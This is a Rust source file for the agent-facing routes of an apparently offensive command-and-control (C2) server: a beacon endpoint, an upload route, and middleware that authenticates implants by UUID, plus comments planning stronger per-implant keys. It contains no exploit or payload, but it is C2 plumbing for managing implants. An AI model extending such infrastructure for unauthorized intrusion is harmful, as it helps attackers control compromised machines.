mod upload;


use std::net::SocketAddr;
use std::str::FromStr;
use std::sync::Arc;
use axum::{
	Json, Router,
	extract::{ConnectInfo, Request, State},
	http::{self, StatusCode},
	middleware::{self, Next},
	response::{IntoResponse, Response},
	routing::post
};
use serde_json::{json, Value};
use tokio_postgres::Client;
// use sqlx::PgPool;
use uuid::Uuid;


use crate::AppState;
use crate::error::Error;
use crate::model::{
	db::Agent,
	agent::BeaconData
};
use crate::routes::agents::upload::upload_handler;
use crate::settings::SETTINGS;

// TODO => Need consistency - Is it Implants or Agents ?
//          IT'S AGENT 
//

pub fn get_routes(app_state: Arc<AppState>) -> Router<Arc<AppState>> {
	let r = &SETTINGS.http.routes;
	Router::new()
		.route(&r.agent.beacon, post(beacon_handler))
		.route(&r.agent.upload, post(upload_handler))
		.layer(middleware::from_fn_with_state(app_state.clone(), agent_middleware))
		.with_state(app_state)
}


// TODO Make it better
pub async fn beacon_handler(
	Json(beacon_data): Json<BeaconData>
) -> Result<impl IntoResponse, Error> {
	tracing::debug!("An agent just connected to beacon endpoint :\n{beacon_data:#?}");
	Ok(Json(json!({})))
}



/// This is the middleware that authenticates agents
pub async fn agent_middleware(
	State(state): State<Arc<AppState>>,
	ConnectInfo(addr): ConnectInfo<SocketAddr>,
	mut req: Request,
	next: Next,
) -> Result<Response, Error> {
	let auth_header = req.headers_mut().get(http::header::AUTHORIZATION);
	let auth_header = match auth_header {
		Some(val) => val.to_str().map_err(|_| log_attempt(addr))?,
		None => return Err(log_attempt(addr)),
	};
	let mut header = auth_header.split_whitespace();
	let str_uuid = header.next().ok_or_else(|| log_attempt(addr))?;
	let uuid = Uuid::from_str(str_uuid).map_err(|_| log_attempt(addr))?;

	let agent_data = query_agent_by_id(&uuid, &state.db)
		.await
	    .map_err(|_| log_attempt(addr))?;

	//  TODO Find a better way to authenticate implants
	//
	//  Right now implants can be impersonated if you just steal their UUID
	//  An fun idea :
	//      - [on server] Operator register new implant keys => generates shared secret
	//      - Include shared secret in implants - The other in database with implant uuid as "index"
	//      - [on implant] maybe hkdf or something - encrypt w/ AEAD like chachapoly or something like that
	//      - Asymmetric & Unique per implant meaning its revocable (just delete the key in db)
	//
	//  This method is channel agnostic - not relying on a specific communication channel and should
	//  still work when using different ways of beaconing back to C2

	req.extensions_mut().insert(agent_data);
	Ok(next.run(req).await)
}

/// Small function that always returns [Error::PermissionDenied]
/// but it logs the invalid request for future inspection
fn log_attempt(addr: SocketAddr) -> Error {
	tracing::error!("Invalid request from {addr} on agent endpoints ! Check the logs ASAP !");
	Error::PermissionDenied
}



/// Utility function that searches for an agent using its UUID
pub async fn query_agent_by_id(
	agent_id: &Uuid,
	db: &Client,
) -> Result<Agent, (StatusCode, Json<Value>)> {
	let result = db.query_opt("SELECT * FROM agents WHERE id = $1 LIMIT 1", &[&agent_id])
	               .await
	               .map_err(|_| Error::InternalError.as_tuple_json())?;

	match result {
		Some(row) => Ok(Agent::from(row)),
		None => {
			Err(( StatusCode::OK, Json(json!({"Result": format!("Agent {agent_id} not found.")})) ))
		}
	}
}

